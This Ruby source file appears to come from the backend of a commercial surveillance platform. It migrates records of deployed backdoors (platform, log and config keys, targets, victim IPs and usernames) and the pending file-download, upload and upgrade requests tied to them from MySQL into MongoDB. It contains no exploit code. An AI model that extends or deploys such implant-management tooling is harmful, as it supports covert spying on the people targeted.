require 'rcs-db/db_layer'
require 'rcs-db/grid'

module RCS
module DB

class BackdoorMigration
  extend Tracer
  
  def self.migrate(verbose)
  
    print "Migrating backdoors "

    backdoors = DB.instance.mysql_query('SELECT * from `backdoor` ORDER BY `backdoor_id`;').to_a
    backdoors.each do |backdoor|

      # is this a backdoor or a factory?!?!
      kind = (backdoor[:class] == 0) ? 'backdoor' : 'factory'
      
      # skip item if already migrated
      next if Item.count(conditions: {_mid: backdoor[:backdoor_id], _kind: kind}) != 0

      trace :info, "Migrating backdoor '#{backdoor[:backdoor]}'." if verbose
      print "." unless verbose
            
      mb = ::Item.new
      mb[:_mid] = backdoor[:backdoor_id]
      mb.name = backdoor[:backdoor]
      mb.desc = backdoor[:desc]
      mb._kind = kind
      mb.status = backdoor[:status].downcase
      mb.demo = false
      
      mb.build = backdoor[:build]
      
      mb.instance = backdoor[:instance].downcase if kind == 'backdoor'
      mb.version = backdoor[:version].to_i if kind == 'backdoor'
      
      mb.logkey = backdoor[:logkey]
      mb.confkey = backdoor[:confkey]
      mb.type = backdoor[:type].downcase
      
      if kind == 'backdoor'
        mb.platform = backdoor[:subtype].downcase
        mb.platform = 'windows' if ['win32', 'win64'].include? mb.platform
        mb.platform = 'ios' if mb.platform == 'iphone'
        mb.platform = 'osx' if mb.platform == 'macos'
      end
      
      mb.deleted = (backdoor[:deleted] == 0) ? false : true
      mb.uninstalled = (backdoor[:uninstalled] == 0) ? false : true if kind == 'backdoor'
      
      mb.counter = backdoor[:counter] if kind == 'factory'
      
      mb.seed = backdoor[:pathseed]

      mb.stat = Stat.new
      mb.stat.evidence = {}
      mb.stat.size = 0
      mb.stat.grid_size = 0
      
      target = Item.where({_mid: backdoor[:target_id], _kind: 'target'}).first
      mb.path = target[:path] + [ target[:_id] ]

      mb.save
      
    end
    
    puts " done."
    
  end

  def self.migrate_associations(verbose)
    # filesystems
    
    print "Migrating filesystems "
    
    filesystems = DB.instance.mysql_query('SELECT * from `filesystem` ORDER BY `filesystem_id`;').to_a
    filesystems.each do |fs|
      backdoor = Item.where({_mid: fs[:backdoor_id], _kind: 'backdoor'}).first
      begin
        backdoor.filesystem_requests.create!(path: fs[:path], depth: fs[:depth])
      rescue Mongoid::Errors::Validations => e
        next
      end
      print "." unless verbose
    end
    
    puts " done."
    
    # downloads

    print "Migrating downloads "

    downloads = DB.instance.mysql_query('SELECT * from `download` ORDER BY `download_id`;').to_a
    downloads.each do |dw|
      backdoor = Item.where({_mid: dw[:backdoor_id], _kind: 'backdoor'}).first
      begin
        backdoor.download_requests.create!(path: dw[:filename])
      rescue Mongoid::Errors::Validations => e
        next
      end
      print "." unless verbose
    end

    puts " done."

    # upgrades

    print "Migrating upgrades "

    upgrades = DB.instance.mysql_query('SELECT * from `upgrade` ORDER BY `upgrade_id`;').to_a
    upgrades.each do |ug|
      backdoor = Item.where({_mid: ug[:backdoor_id], _kind: 'backdoor'}).first

      next if backdoor.upgradable == true

      print "." unless verbose

      backdoor.upgradable = true
      backdoor.save
    end
    
    puts " done."
    
    # uploads
    
    print "Migrating uploads "

    stats = DB.instance.mysql_query('SELECT * from `upload` ORDER BY `upload_id`;').to_a
    stats.each do |up|
      backdoor = Item.where({_mid: up[:backdoor_id], _kind: 'backdoor'}).first
      begin
        upload = backdoor.upload_requests.create!(filename: up[:filename])
        upload[:_grid] = [ GridFS.instance.put(up[:content], {filename: up[:filename]}) ]
        upload.save
      rescue Mongoid::Errors::Validations => e
        next
      end
      
      print "." unless verbose
    end
    
    puts " done."

    # stats
    
    print "Migrating stats "

    stats= DB.instance.mysql_query('SELECT * from `stat` ORDER BY `backdoor_id`;').to_a
    stats.each do |st|
      backdoor = Item.where({_mid: st[:backdoor_id], _kind: 'backdoor'}).first

      next unless backdoor.stat.nil? or backdoor.stat.source.nil?

      print "." unless verbose

      ms = ::Stat.new
      ms.source = st[:remoteip]
      ms.user = st[:remoteuser]
      ms.device = st[:remotehost]
      ms.last_sync = st[:received].to_i unless st[:received].nil?
      ms.evidence = {}
      ms.size = 0
      ms.grid_size = 0

      backdoor.stat = ms

      backdoor.save
    end

    puts " done."

  end
end

end # ::DB
end # ::RCS
